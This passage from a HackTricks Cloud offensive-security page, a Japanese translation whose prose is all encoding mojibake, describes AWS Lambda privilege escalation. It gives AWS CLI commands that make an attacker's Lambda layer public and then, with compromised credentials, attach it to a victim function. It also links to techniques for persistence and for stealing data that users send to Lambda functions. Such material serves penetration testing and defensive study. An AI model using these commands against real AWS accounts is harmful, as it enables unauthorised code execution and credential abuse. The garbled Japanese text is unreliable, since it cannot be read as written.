**ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’å…¬é–‹ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã«ã—**ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒãã‚Œã‚’ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã“ã® API å‘¼ã³å‡ºã—ã«ã¯å€‹äººã® AWS è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
ç¾åœ¨ã€**ä¾µå®³ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±**ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®Lambdaé–¢æ•°ã€Œs3-getterã€ã«å¯¾ã—ã¦ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã€**ã‚¯ãƒ­ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆLambdaãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’ã‚¢ã‚¿ãƒƒãƒ**ã—ã¾ã™ã€‚
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€è‡ªåˆ†ãŸã¡ã§**é–¢æ•°ã‚’å‘¼ã³å‡ºã™**ã“ã¨ãŒã§ãã‚‹å ´åˆã¯ãã‚Œã‚’è¡Œã†ã‹ã€é€šå¸¸ã®æ‰‹æ®µã«ã‚ˆã£ã¦**å‘¼ã³å‡ºã•ã‚Œã‚‹ã¾ã§å¾…ã¤**ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯ã‚ˆã‚Šå®‰å…¨ãªæ–¹æ³•ã§ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’**ã‚ˆã‚Šæ…é‡ã«æ‚ªç”¨ã™ã‚‹æ–¹æ³•**ã¯ä»¥ä¸‹ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**æ½œåœ¨çš„ãªå½±éŸ¿ï¼š** Lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥ã®æ¨©é™æ˜‡æ ¼ã€‚

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

ã“ã‚Œã‚‰ã®æ¨©é™ãŒã‚ã‚Œã°ã€é–¢æ•°ã‚’ä½œæˆã—ã¦URLã‚’å‘¼ã³å‡ºã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€ãƒ†ã‚¹ãƒˆã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã§ã—ãŸã®ã§ã€ã‚‚ã—ã‚ãªãŸãŒã§ããŸã‚‰æ•™ãˆã¦ãã ã•ã„ï¼

### Lambda MitM

ä¸€éƒ¨ã®Lambdaã¯ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®**æ©Ÿå¯†æƒ…å ±ã‚’å—ã‘å–ã‚‹**ã“ã¨ã«ãªã‚Šã¾ã™ã€‚ã‚‚ã—RCEã‚’æ‰‹ã«å…¥ã‚ŒãŸã‚‰ã€ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒé€ä¿¡ã—ã¦ã„ã‚‹æƒ…å ±ã‚’æŠœãå–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã§ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## å‚è€ƒæ–‡çŒ®

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§<strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã«ã‚ãªãŸã®**ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰**ã—ã¦ãã ã•ã„ã€‚

</details>
